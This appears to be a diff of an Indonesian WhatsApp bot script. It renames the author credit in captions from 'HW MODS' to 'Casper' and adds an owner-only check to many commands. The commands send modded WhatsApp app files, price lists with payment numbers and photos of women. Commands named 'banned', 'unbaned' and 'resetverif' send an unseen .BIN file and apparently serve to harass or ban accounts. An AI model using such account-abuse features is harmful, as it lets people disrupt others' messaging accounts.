@@ -3369,7 +3496,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "ngqg7NXELMylExItJSx6yCR/WLvwgE30Uaz7ffHoFI8=",
 "directPath": "/v/t62.7119-24/13763860_152939334171740_6756609789846514582_n.enc?ccb=11-4&oh=01_AdRZvTl3Xq_P81_gLahjaLXv7_mJaci-yB3IbHIrDhvlFA&oe=63E22966",
 "mediaKeyTimestamp": "1673183311",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3400,7 +3527,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "QDqHaBRpJ/fLIyMNgzVWjVVN2/5pjnofi1CSzjVES7E=",
 "directPath": "/v/t62.7119-24/30957615_1511635945979743_5505496555941343278_n.enc?ccb=11-4&oh=01_AdTZ49WMm8qqcOPsZYih0CGlC30xDjTpOckfyHhWomAY8g&oe=63E2480F",
 "mediaKeyTimestamp": "1673182527",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3432,7 +3559,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "at/92MJZp856mqiwp+scL0CiJ9RhJ36+So6w3fhyLRY=",
 "directPath": "/v/t62.7119-24/35201011_1354414975318864_8414635329800543416_n.enc?ccb=11-4&oh=01_AdQi7TD1lhrqskdiiWfMTg4lpCWJXF0bprYyY5kXGm43_g&oe=63E221F7",
 "mediaKeyTimestamp": "1673182527",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3463,7 +3590,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "8i68nLN0qJ7WPbt2QdTsTcD8HRdGw0c+CuY1NgK0WFw=",
 "directPath": "/v/t62.7119-24/30024119_2472137919604014_2433576390214876562_n.enc?ccb=11-4&oh=01_AdQ9HjFuka0LVhusUvcr8swpOSmqQoRrOqAoP9LBpH6TzQ&oe=63E2290B",
 "mediaKeyTimestamp": "1673182527",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3493,7 +3620,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "58M7+bXYn2WfYISmU5xrp+jjYyT90xRCrPotBhwysrE=",
 "directPath": "/v/t62.7119-24/29231642_217221087373927_1255336424081941846_n.enc?ccb=11-4&oh=01_AdTlpDi0w3wwiBsZHhvizOERjbvNakpI9x_lEJwEBTYHOw&oe=63E21A47",
 "mediaKeyTimestamp": "1673182527",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3524,7 +3651,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "l8qUD/DxduackJL+aVBy/lhDrmVI68/Lhch+X0VhUzo=",
 "directPath": "/v/t62.7119-24/31979775_547821587361656_1119496716832352749_n.enc?ccb=11-4&oh=01_AdSP1OHQIt_exuK06AYY1j-UdFVk3-NHfgALuCGkql1bVg&oe=63E21F07",
 "mediaKeyTimestamp": "1673181141",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3555,7 +3682,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "JW81e8yD8yRoNV/dMB7m3hr9o/aWfEad0CAE66dOwDs=",
 "directPath": "/v/t62.7119-24/35261867_631466192085771_3320560928032684188_n.enc?ccb=11-4&oh=01_AdRMM2krCyNqxruyk2MhiJkGde6VlEXPJUqN6KZ4RO544g&oe=63DE076F",
 "mediaKeyTimestamp": "1672903280",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3584,7 +3711,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "Mz4AumgNwH8PAEYfudoNvsMurd5aV3HD6wDgxjGdAVY=",
 "directPath": "/v/t62.7119-24/29336596_492043203071081_6910390125030767965_n.enc?ccb=11-4&oh=01_AdTxzAaHnuX8SwuHtmmvqeTIzMMlyyL4oTSqp8801dQquA&oe=63E2438D",
 "mediaKeyTimestamp": "1673181587",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3614,7 +3741,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "e8zq+b92Mid4kqqyHjQqTvn8kSZai3PXfg0j5hAZ/do=",
 "directPath": "/v/t62.7119-24/21582267_234176845613728_4154839308800527485_n.enc?ccb=11-4&oh=01_AdT48UUWQhBkm6BpgHMR3PyvUQu_5CE1W_GLZS-Jma_7wg&oe=63E227C7",
 "mediaKeyTimestamp": "1673181942",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3643,7 +3770,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "cRwxyP6wpe9g3gh8oTxFyRH+8+chSXj5cZnYsyhcWn4=",
 "directPath": "/v/t62.7119-24/40697900_1132286054114597_6407413577873705490_n.enc?ccb=11-4&oh=01_AdS6JwsUp3cd1pH8Qi_nFaUOYF0US2HeGms9-OaiOF3eew&oe=63E21CC8",
 "mediaKeyTimestamp": "1673062140",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3673,7 +3800,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "sGUEsIGepkr7U9526ie0CtgjB1o6IeQLoTTbVulGQ7Y=",
 "directPath": "/v/t62.7119-24/33538326_4570455823079139_5863659581296623888_n.enc?ccb=11-4&oh=01_AdTGp3LzY8rK87kWiUw3XCvsQKVgrMz40JYtaWTrZTA9iA&oe=63E21DD7",
 "mediaKeyTimestamp": "1673181942",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3703,7 +3830,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "HS5o73SZdzpGgFC2wk7zVOIfC/aqEEb6R7KDZxa+ics=",
 "directPath": "/v/t62.7119-24/32323647_1704522319943063_7268744727360475273_n.enc?ccb=11-4&oh=01_AdTfiFnWCo_tG9aLOmNkA7RjIBcXLvma8JeW5yEbEN4iqg&oe=63DB9E35",
 "mediaKeyTimestamp": "1672750462",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3735,7 +3862,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "Y5g/cazDY49sFl72yHUr5J2sJvOTXrCEEcio+Ms15wM=",
 "directPath": "/v/t62.7119-24/25248586_1481423949032257_8662275218785410107_n.enc?ccb=11-4&oh=01_AdTQ15Pq-s4OP2a9fv47ZOedXOx1hqQf1gDzz0Tz8QQKWQ&oe=63DB98CF",
 "mediaKeyTimestamp": "1672750462",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3766,7 +3893,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "8mgWerVQlnLcKPBCtZAkCqYpMznRoBjb8uoLqVopFFg=",
 "directPath": "/v/t62.7119-24/25529407_1424674921695790_2054483089005385603_n.enc?ccb=11-4&oh=01_AdRwDo1ZhGIoOzaW5nVZJTIWJRy7gpKrcZBSLt0owv4obA&oe=63DB9916",
 "mediaKeyTimestamp": "1672750462",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3799,7 +3926,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "gCArAKb/bhhj/mbW1lRyb5n9HuvzE7DrzSMjA7Z4efk=",
 "directPath": "/v/t62.7119-24/56019076_142608418616022_7634680365294243285_n.enc?ccb=11-4&oh=01_AdQLRLfDtsJhvYEKvEusnT5LYOTHEEfCNkxeQeC71LqVDA&oe=63DB9CD4",
 "mediaKeyTimestamp": "1672750462",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3831,7 +3958,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "LhRhDeOo36rEzR36xK9AM4ABFzfPBQryr6pEDAYbbis=",
 "directPath": "/v/t62.7119-24/55680376_1826485511055382_512259021203785243_n.enc?ccb=11-4&oh=01_AdQB-PYzelluYHBSgjbMhuyzFU8g1upO9fxkUrPBrF3j4A&oe=63DB900E",
 "mediaKeyTimestamp": "1672750462",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3865,7 +3992,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "vcOpbu1cnI6RhauCyVEhIAKqMBmvqY34+nL//2n9nIA=",
 "directPath": "/v/t62.7119-24/30549695_5139404179494774_4648086889572207755_n.enc?ccb=11-4&oh=01_AdRgECyJ5L7pEbRQ6gQImiq3nhZqJ8QLGqpOuOyB_jZPZg&oe=63DBA58E",
 "mediaKeyTimestamp": "1672750462",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -3929,6 +4056,7 @@ reply('sukses Kirim Script')
 break
 //=================================================//
 case 'jualan': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 .whatsapp
@@ -3944,6 +4072,7 @@ reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 break
 //=================================================//
 case 'whatsapp': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -3962,6 +4091,7 @@ break
 
 //=================================================//
 case 'panel': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4004,6 +4134,7 @@ Admin3 = 62895403595055
 break
 //=================================================//
 case 'pulsa': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4025,6 +4156,7 @@ ________________
 break
 //=================================================//
 case 'payment': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4035,6 +4167,7 @@ Dana : 085771061154`)
 break
 //=================================================//
 case 'tutorial': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4044,6 +4177,7 @@ https://youtu.be/rqqxkI4P8YY`)
 break
 //=================================================//
 case '5000': case '7k':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4055,6 +4189,7 @@ Dana : 085771061154`)
 }
 break
 case '10000': case '12k': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4066,6 +4201,7 @@ Dana : 085771061154`)
 }
 break
 case '15000': case '16k': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4077,6 +4213,7 @@ Dana : 085771061154`)
 }
 break
 case '20000': case '22k': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4088,6 +4225,7 @@ Dana : 085771061154`)
 }
 break
 case '25000': case '25k': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4099,6 +4237,7 @@ Dana : 085771061154`)
 }
 break
 case '30000': case '31k': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4110,6 +4249,7 @@ Dana : 085771061154`)
 }
 break
 case '50000': case '51k': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4121,6 +4261,7 @@ Dana : 085771061154`)
 }
 break
 case '100000': case'99k':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4132,6 +4273,7 @@ Dana : 085771061154`)
 }
 break
 case '150000': case '147k':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4143,6 +4285,7 @@ Dana : 085771061154`)
 }
 break
 case '200000': case '195k':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4168,7 +4311,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileEncSha256": "LAmKijY7XCKJrONV0cBXPiCNVYJdYLMjMOsi+q4pd2g=",
 "directPath": "/v/t62.7119-24/34960356_543134977691326_1792059771773909536_n.enc?ccb=11-4&oh=01_AdQHN60wPp2-oLvINncKbeOse99hDWzyfjN2G4S0G4kr1g&oe=63C591FA",
 "mediaKeyTimestamp": "1671207354",
-"caption": "Hallo Kak Aplikasi Ini Adalah Buatan Asli Hw Mods Aman Dan Terpercaya Selamat Belajar ❤️",
+"caption": "Hallo Kak Aplikasi Ini Adalah Buatan Asli Casper Aman Dan Terpercaya Selamat Belajar ❤️",
 }
 }), { userJid: m.chat })
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
@@ -4177,6 +4320,7 @@ reply('sukses Kirim Script')
 break
 //=================================================//
 case 'jasarun': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4197,6 +4341,7 @@ Wa.me/6285649455626?text=Bang+Jasa+Run`)
 break
 //=================================================//
 case 'bagaimanakah':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
 const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
@@ -4205,7 +4350,8 @@ haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quote
 break
 //=================================================//
  case 'apakah':
- if (isBan) return reply(`Lah Lu Kan Di Ban`)
+ if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
 const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
 const kah = apa[Math.floor(Math.random() * apa.length)]
@@ -4213,107 +4359,128 @@ haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` },
 break
 //=================================================//
 case 'cecan1': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/6c/59/ee/6c59ee71dd001504309d8fa999419765.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/eb/3d/c2/eb3dc2c7a69abf471127fac837c0ac90.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan3': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/e5/5a/20/e55a20a9c762d5578884af81e33ecfff.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan4': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/62/b6/37/62b6370726160df92fa26d51df2bb9f5.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/af/ef/ca/afefcafc1ad008cee1021602c05f5986.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan6': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/36/8d/f1/368df1b6fc71343febf89b698d0c1668.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan7': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/db/c7/40/dbc7403ea7d36e5a192008d777293b02.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan8': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/f6/19/b0/f619b02f2ec4b28c152dc0ef02a671f2.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan9': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/b6/7d/15/b67d154789da7138e80179bb03651aec.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan10': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/97/c8/46/97c8460a8e5217239149dd9fa1ca81c3.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan11': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/bd/fd/94/bdfd9417121ccbf52cb9ba83156b005f.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan12': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/e1/37/5b/e1375b427cf9e0c6710e1965490f4057.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan13': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/39/8e/4b/398e4bb0e7ab5e55121b03a24352d0bf.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan14': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/7b/5b/a3/7b5ba32bb7ba1303a824643fdb00be4e.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan15': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/41/5a/9d/415a9dd402305fdae61e081b906bcfa6.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan16': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/72/8e/e4/728ee4c55d857d6c90b39c27a42c9ac9.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan17': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/b8/36/65/b83665498cdc46ba542739e56c43b36a.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan18': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/59/25/07/592507dc13a8355e661eaeb73c442c6c.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan19': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/30/64/90/30649018b4ba4813d03e4c846d8d1ef2.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 case 'cecan20': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/6e/89/57/6e89574602653d1e88227658ff206d82.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
 }
 break
 //=================================================//
 case 'detectadmin': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!m.isGroup) return groupon(from)
 if (!isAdmins && !isCreator) return sticAdmin(from)
@@ -4335,6 +4502,7 @@ break
 
 //=================================================//
 case 'nowa': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
 var noteks = args[0]
@@ -4465,6 +4633,7 @@ Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Jualan Bot Ada Di List
 break
 //=================================================//
 case 'listwibu':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
@@ -4528,6 +4697,7 @@ reply(`Waalaikumsalam`)
 break
 //=================================================//
 case 'banned': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
  var message = {
 document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
@@ -4544,6 +4714,7 @@ haikal.sendMessage(m.chat, message, { quoted:m })
 break
 //=================================================//
 case 'unbaned': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
  var message = {
 document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
@@ -4560,6 +4731,7 @@ haikal.sendMessage(m.chat, message, { quoted:m })
 break
 //=================================================//
 case 'resetverif': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
  var message = {
 document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
